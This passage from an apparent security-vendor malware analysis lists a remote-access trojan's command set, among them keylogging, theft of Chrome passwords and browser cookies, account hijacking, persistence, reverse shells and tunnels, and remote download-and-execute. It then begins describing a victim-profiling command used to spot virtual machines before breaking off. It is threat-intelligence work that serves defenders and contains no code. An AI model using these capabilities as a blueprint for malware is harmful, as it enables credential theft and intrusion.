  Download and deploy the NetSupport RAT
  </td></tr><tr><td>
  keylogadd
  </td><td>
  Add an additional keylogger
  </td></tr><tr><td>
  keylogdel
  </td><td>
  Delete Keylogger
  </td></tr><tr><td>
  keyloglist
  </td><td>
  List all keyloggers
  </td></tr><tr><td>
  keylogreset
  </td><td>
  Reset keyloggers
  </td></tr><tr><td>
  keylogstart
  </td><td>
  Start logging keys
  </td></tr><tr><td>
  sshurl
  </td><td>
  Download ssh.zip
  </td></tr><tr><td>
  getkeylog
  </td><td>
  Obtain log of logged keys
  </td></tr><tr><td>
  getchromepasswords
  </td><td>
  Grab all chrome passwords from the sqlite3 database
  that chrome stores them in.&nbsp; Saved to
  c:windowstemplogins_read.txt
  </td></tr><tr><td>
  getmozillacookies
  </td><td>
  Grab all mozilla cookies.&nbsp; Saved to c:windowstempmoz.txt
  </td></tr><tr><td>
  getchromecookies
  </td><td>
  Grab all chrome cookies.&nbsp; Saved to c:windowstempcookies.txt
  </td></tr><tr><td>
  search
  </td><td>
  Allows the threat actor to search chrome cookies,
  passwords, and mozilla cookies
  </td></tr><tr><td>
  bkport
  </td><td>
  Like bk, but allows the threat actor to specify port
  instead of C2 address
  </td></tr><tr><td>
  hijack
  </td><td>
  Attempts to hijack a user’s account
  </td></tr><tr><td>
  persist
  </td><td>
  Adds additional persistence to the malware
  </td></tr><tr><td>
  stophijack
  </td><td>
  Stop the active hijack
  </td></tr><tr><td>
  sethijack
  </td><td>
  Set the hijack settings for logged in user
  </td></tr><tr><td>
  setcopyurl
  </td><td>
  Set url to download profile copier (cp.exe)
  </td></tr><tr><td>
  forcekill
  </td><td>
  Force kill open process
  </td></tr><tr><td>
  nop
  </td><td>
  Heartbeat
  </td></tr><tr><td>
  tun
  </td><td>
  Open a ssh tunnel
  </td></tr><tr><td>
  slp
  </td><td>
  Sleep
  </td></tr><tr><td>
  killtun
  </td><td>
  Kill all ssh tunnels
  </td></tr><tr><td>
  shell
  </td><td>
  Open a cmd shell
  </td></tr><tr><td>
  update
  </td><td>
  Updates the current running malware
  </td></tr><tr><td>
  load
  </td><td>
  Downloads and executes a file from a URL
  </td></tr><tr><td>
  socks
  </td><td>
  Similar to tun, allows a reverse tunnel to be opened
  on any port on the infected machine
  </td></tr></tbody></table></figure>



<h2 class="wp-block-heading">Command Explanations: info Gathers Victim Computer Information</h2>



<p>The “info” command will obtain the following information pertaining to the infected victim:</p>



<ul class="wp-block-list"><li>Total RAM memory</li><li>Video Controller Name</li><li>CPU name</li></ul>



<p>This is a good way to identify if an infected victim is a
VM, as VM RAM count should be fairly small, and either Video Controller or CPU
may be named something associated w    </div> <!-- @end .entry-content -->
    
</article> <!-- @end #post-5607 -->
        
    </div>
            <div class="post-aside" data-position="left">

    <div class="footer-widgets">
        <div class="footer-widgets__row" data-fluid="false" data-col="4-col">
                                                <div class="footer-widgets__col">
                                                    <aside class="footer-area-menus">
                                <div class="widget widget_walker_menu">
                                    <h2 class="widget__title ">
                                        Services                                    </h2>
                                    <nav class="footer-area-walker-menu shared-walker-menu" aria-label="Footer Area 1 Menu">
                                        <ul id="footer-area-1-menu" class="menu" role="menu"><li id="menu-item-2991" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2991"role="menuitem"><a href="https://www.binarydefense.com/services/managed-detection-and-response/" class="menu-item__link"><span class="menu-item__label"><span class="menu-item__content"><span class="menu-item__text">Managed Detection and Response</span></span></span></a></li>
